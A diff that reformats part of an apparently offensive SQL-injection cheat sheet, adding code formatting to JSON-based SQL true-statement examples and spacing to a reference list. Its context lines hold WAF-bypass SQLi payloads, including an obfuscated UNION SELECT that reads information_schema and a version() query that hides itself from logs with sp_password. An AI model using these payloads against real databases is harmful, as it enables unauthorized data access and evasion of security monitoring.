@@ -438,11 +438,11 @@ id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.ta
 The New ‘ or ‘a’=’a
 Using JSON syntax, it is possible to craft new SQLi payloads. These payloads, since they are not commonly known, could be used to fly under the radar and bypass many security tools. Using syntax from different database engines, we were able to compile the following list of true statements in SQL:
 
-PostgreSQL: '{"b":2}'::jsonb <@ '{"a":1, "b":2}'::jsonb Is the left JSON contained in the right one? True.
+PostgreSQL: `'{"b":2}'::jsonb <@ '{"a":1, "b":2}'::jsonb` Is the left JSON contained in the right one? True.
 
-SQLite: '{"a":2,"c":[4,5,{"f":7}]}' -> '$.c[2].f' = 7 Does the extracted value of this JSON equals 7? True. 
+SQLite: `'{"a":2,"c":[4,5,{"f":7}]}' -> '$.c[2].f' = 7` Does the extracted value of this JSON equals 7? True. 
 
-MySQL: JSON_EXTRACT('{"id": 14, "name": "Aztalan"}', '$.name') = 'Aztalan' Does the extracted value of this JSON equals to ‘Aztalan’? True.
+MySQL: `JSON_EXTRACT('{"id": 14, "name": "Aztalan"}', '$.name') = 'Aztalan'` Does the extracted value of this JSON equals to ‘Aztalan’? True.
 
 ![image](https://user-images.githubusercontent.com/5785346/208339982-df4bc8ab-f825-4034-8fc1-ddb04059a226.png)
 ![image](https://user-images.githubusercontent.com/5785346/208340020-fb416d7a-1230-4b4c-8f14-5121cdacde0c.png)
@@ -995,5 +995,6 @@ id=-725+UNION+SELECT+1,version(),3,4,5--sp_password //使用sp_password隐藏log
 ## Reference
   
 [Beyond SQLi: Obfuscate and Bypass](https://www.exploit-db.com/papers/17934/)
+
 [{JS-ON: Security-OFF}: Abusing JSON-Based SQL to Bypass WAF](https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf?utm_campaign=%5BTeam82%5D+%7BJS-ON%3A+Security-OFF%7D+blog+-+December+2022&utm_content=Oktopost-twitter&utm_source=twitter&utm_tags=Blog%2Cvulnerability+disclosures%2CTEAM82%2Cresearch%2Cjson)
   
